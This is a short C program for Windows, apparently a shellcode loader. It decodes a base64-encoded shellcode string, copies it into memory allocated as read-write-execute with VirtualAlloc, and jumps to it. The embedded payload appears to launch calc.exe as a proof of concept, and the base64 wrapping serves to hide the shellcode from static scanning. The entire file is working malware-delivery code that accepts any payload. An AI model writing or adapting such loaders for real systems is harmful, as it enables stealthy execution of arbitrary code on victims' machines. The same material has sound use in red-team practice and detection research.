#include <windows.h>

unsigned char buf_b64[] = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";

BOOL B64Decode( LPCSTR Input, PBYTE* Output, SIZE_T* OutLen )
{
	PBYTE	Buffer = NULL;
	SIZE_T	Length;
	SIZE_T	DecodeLength;
	SIZE_T	X;
	SIZE_T	Y;
	SIZE_T	Z;

	int B64Invs[ ] = { 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58,
		59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5,
		6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
		21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28,
		29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42,
		43, 44, 45, 46, 47, 48, 49, 50, 51 };

	if ( Input == NULL )
		return 0;

	Length = strlen( Input );
	if ( Length % 4 != 0 )
		return FALSE;


	DecodeLength = Length / 4 * 3;
	for ( X = Length; X-- > 0; ) {
		if ( Input[ X ] == '=' ) {
			DecodeLength--;
		}
		else {
			break;
		}
	}

	Buffer = ( PBYTE ) LocalAlloc( LMEM_ZEROINIT, DecodeLength );
	if ( Buffer == NULL )
		return ( FALSE );

	for ( X = 0; X < Length; X++ ) {
		if ( Input[ X ] >= '0' && Input[ X ] <= '9' )
			continue;
		else if ( Input[ X ] >= 'A' && Input[ X ] <= 'Z' )
			continue;
		else if ( Input[ X ] >= 'a' && Input[ X ] <= 'z' )
			continue;
		else if ( Input[ X ] == '+' || Input[ X ] == '/' || Input[ X ] == '=' )
			continue;
		else
			return 0;
	}

	for ( X = 0, Y = 0; X < Length; X += 4, Y += 3 ) {
		Z = B64Invs[ Input[ X ] - 43 ];
		Z = ( Z << 6 ) | B64Invs[ Input[ X + 1 ] - 43 ];
		Z = Input[ X + 2 ] == '=' ? Z << 6 : ( Z << 6 ) | B64Invs[ Input[ X + 2 ] - 43 ];
		Z = Input[ X + 3 ] == '=' ? Z << 6 : ( Z << 6 ) | B64Invs[ Input[ X + 3 ] - 43 ];

		Buffer[ Y ] = ( Z >> 16 ) & 0xFF;
		if ( Input[ X + 2 ] != '=' )
			Buffer[ Y + 1 ] = ( Z >> 8 ) & 0xFF;
		if ( Input[ X + 3 ] != '=' )
			Buffer[ Y + 2 ] = Z & 0xFF;
	}

	if ( Output )
		*Output = Buffer;
	if ( OutLen )
		*OutLen = DecodeLength;

	return TRUE;
}

int main() {
	LPVOID  pMemory  = NULL;
	DWORD   dwSize   = 0;
    PBYTE   pShellcode = 0;
    SIZE_T  sShellcode = 0;

    B64Decode(buf_b64, &pShellcode, &sShellcode);

	// Allocate memory.
	pMemory = VirtualAlloc(NULL, sShellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// Copy memory.
	memcpy(pMemory, pShellcode, sShellcode);

	// Execute shellcode.
	((DWORD(*)())pMemory)();
	
	return (0);
}
